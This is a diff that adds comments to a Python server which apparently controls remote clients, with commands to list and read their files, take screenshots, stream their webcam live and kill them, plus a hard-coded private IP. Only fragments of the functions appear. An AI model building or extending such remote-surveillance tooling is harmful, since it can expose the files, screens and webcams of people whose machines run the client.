@@ -9,15 +9,15 @@ import time
 import cv2
 import numpy as np
 
+# Global variables
 SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
 READ_FILE_DIR = 'reads/{ip}/{date}'
 LOG_FILE_DIR = 'logs/{ip}/{date}'
-
 last_client_socket = None
 stop = False
 
 
-# Function to parse the arguments
+# Function to set up the command line arguments
 def args_parse(command_line=None):
     parser = argparse.ArgumentParser(description='Server of file receiver')
     parser.add_argument('-l', '--listen', type=int, default=9809, help='Port to listen on')
@@ -33,7 +33,7 @@ def args_parse(command_line=None):
         return parser.parse_args()
 
 
-# Function to set up the server
+# Function to create the server socket
 def create_server_socket(host, port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
@@ -41,6 +41,7 @@ def create_server_socket(host, port):
     return server_socket
 
 
+# Function to handle the command line
 def command_handler_loop(server_socket):
     global stop
     while not stop:
@@ -65,6 +66,7 @@ def command_handler_loop(server_socket):
             continue
 
 
+# Function to show the files received from the client
 def show_files():
     global last_client_socket
     if last_client_socket is None:
@@ -82,6 +84,7 @@ def show_files():
     pass
 
 
+# Function to read the content of a file received from the client
 def read_file(filename):
     global last_client_socket
     if last_client_socket is None:
@@ -99,6 +102,7 @@ def read_file(filename):
         print(f"Error sending read file command: {e}")
 
 
+# Function to take a screenshot from the client
 def take_screenshot():
     global last_client_socket
     if last_client_socket is None:
@@ -115,6 +119,7 @@ def take_screenshot():
         print(f"Error sending screenshot command: {e}")
 
 
+# Function to receive the webcam live from the client
 def receive_webcam_live():
     global last_client_socket
     if last_client_socket is None:
@@ -131,6 +136,7 @@ def receive_webcam_live():
         print(f"Error sending webcam command: {e}")
 
 
+# Function to kill the client
 def kill_client():
     global last_client_socket
     if last_client_socket is None:
@@ -248,6 +254,7 @@ def handle_client(client_socket, client_address):
     print(f"Connection with {client_address} closed")
 
 
+# Function to accept connections from the client
 def accept_connections(server_socket):
     global last_client_socket, stop
     while not stop:
@@ -258,6 +265,7 @@ def accept_connections(server_socket):
         client_thread.start()
 
 
+# Main function
 def main():
     args = args_parse()
     host = '192.168.18.144'
